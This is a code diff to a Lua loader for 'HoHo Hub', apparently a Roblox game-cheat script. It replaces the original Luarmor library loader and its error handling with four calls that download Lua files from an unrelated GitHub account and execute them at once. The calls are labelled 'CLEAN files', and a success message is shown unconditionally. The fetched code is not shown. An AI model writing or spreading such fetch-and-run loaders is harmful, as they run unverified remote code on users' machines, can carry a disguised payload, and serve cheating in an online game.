@@ -795,24 +795,27 @@ do
 		
 		StarterGui:SetCore("SendNotification",{
 			Title = "HoHo Hub",
-			Text = "Loading script...",
+			Text = "Loading CLEAN files...",
 			Icon = "rbxassetid://16276677105"
 		})
 		
-		local success, errorMsg = pcall(function()
-			local api = loadstring(game:HttpGet("https://sdkapi-public.luarmor.net/library.lua"))()
-			api.script_id = isSupport
-			api.load_script()
-		end)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/kests1111/hhv2/refs/heads/main/CLEAN_1766028793.1128223.lua"))()
+		wait(0.2)
 		
-		if not success then
-			StarterGui:SetCore("SendNotification",{
-				Title = "HoHo Hub Error",
-				Text = "Failed to load: " .. tostring(errorMsg),
-				Icon = "rbxassetid://16276677105",
-				Duration = 10
-			})
-		end
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/kests1111/hhv2/refs/heads/main/CLEAN_1766028793.6732476.lua"))()
+		wait(0.2)
+		
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/kests1111/hhv2/refs/heads/main/CLEAN_1766028795.291577.lua"))()
+		wait(0.2)
+		
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/kests1111/hhv2/refs/heads/main/CLEAN_1766028797.5606148.lua"))()
+		wait(0.3)
+		
+		StarterGui:SetCore("SendNotification",{
+			Title = "HoHo Hub",
+			Text = "Script loaded successfully!",
+			Icon = "rbxassetid://16276677105"
+		})
 	end
 	
     Support.MouseButton1Click:Once(function()
